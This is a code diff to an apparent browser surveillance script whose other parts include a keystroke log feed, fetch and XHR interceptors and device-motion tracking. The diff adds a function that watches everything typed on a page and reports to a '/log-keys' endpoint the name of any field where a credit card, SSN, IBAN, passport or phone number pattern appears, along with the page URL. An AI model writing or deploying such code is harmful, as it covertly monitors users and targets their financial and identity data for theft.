@@ -1571,6 +1571,44 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ INPUT TYPE CLASSIFIER ════════════════════════════════
+    // Watches input events and detects when sensitive data patterns are being typed:
+    // credit card numbers, phone numbers, SSN, date-of-birth, postal codes, etc.
+    // Fires a one-shot log per field — does NOT capture the actual value.
+    function initInputTypeClassifier() {
+        const alerted = new WeakSet(); // track which inputs have already fired
+        const patterns = [
+            { re: /\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b/, label: 'CREDIT CARD' },
+            { re: /\b\d{4}[\s\-]?\d{6}[\s\-]?\d{5}\b/,              label: 'AMEX' },
+            { re: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/,                   label: 'PHONE (US)' },
+            { re: /\+\d{1,3}[\s\-]?\d{6,14}/,                        label: 'PHONE (INTL)' },
+            { re: /\b\d{3}[\s\-]\d{2}[\s\-]\d{4}\b/,                 label: 'SSN' },
+            { re: /\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3}\b/, label: 'PASSPORT' },
+            { re: /\b[A-Z]{2}\s?\d{2}\s?\d{4}\s?\d{6}\s?\d{2}[A-Z]\s?\d{3}\s?\d\b/i, label: 'IBAN' },
+        ];
+        document.addEventListener('input', ev => {
+            try {
+                const el = ev.target;
+                if (!el || alerted.has(el)) return;
+                const t = (el.type || '').toLowerCase();
+                if (t === 'password') return;  // don't examine password fields
+                const val = el.value || '';
+                if (val.length < 8) return;    // too short to match
+                for (const { re, label } of patterns) {
+                    if (re.test(val)) {
+                        alerted.add(el);       // only report once per element
+                        const name = el.name || el.id || el.placeholder || 'unknown';
+                        post('/log-keys', {
+                            keys: `[INPUT TYPE] ${label} pattern detected in field "${name.slice(0,40)}"`,
+                            url: location.href
+                        });
+                        break;
+                    }
+                }
+            } catch {}
+        }, true);
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1713,6 +1751,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initWebSocketDetector();
         initFetchInterceptor();
         initXHRInterceptor();
+        initInputTypeClassifier();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
